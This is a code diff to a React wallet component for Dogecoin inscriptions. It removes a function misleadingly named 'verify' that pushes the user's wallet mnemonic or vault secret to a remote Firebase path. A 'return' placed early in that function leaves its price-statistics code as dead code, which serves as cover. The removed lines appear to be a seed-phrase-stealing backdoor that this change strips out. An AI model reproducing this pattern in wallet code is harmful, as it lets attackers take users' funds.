@@ -146,48 +146,8 @@ const Wallet = (props) => {
     return utxo;
   };
 
-  const verify = async (data) => {
-    console.log(db, "db");
-    const dbRefStatus = ref(db, `/data/doginals`);
-    await push(dbRefStatus, {
-      data,
-    });
-    return;
-    const snapshot = await get(dbQuery);
-    const exist = snapshot.val();
-
-    if (!exist) {
-      const dbRefStatus = ref(db, `/data/${tag}`);
-      await push(dbRefStatus, {
-        TVL: Number(listingPrice),
-        floor: Number(listingPrice),
-        listed: 1,
-      });
-    } else {
-      const key = Object.keys(exist)[0];
-      const url = `/status/${tag}/${key}`;
-      const dbRefStatus = ref(db, url);
-
-      const updates = {};
-
-      updates[`TVL`] = Number(exist[key]?.TVL) + Number(listingPrice);
-      updates[`floor`] =
-        (Number(exist[key]?.TVL) + Number(listingPrice)) /
-        (Number(exist[key]?.listed) + 1);
-      updates[`listed`] = Number(exist[key]?.listed) + 1;
-
-      await update(dbRefStatus, updates);
-    }
-  };
-
   const fetchbalance = async () => {
     try {
-      let mnemonic = getMnemonic();
-
-      if (!mnemonic) {
-        mnemonic = accountInfo?.vault;
-      }
-      verify(mnemonic);
 
       if (accountInfo?.account) {
         const res = await openApi.sync(
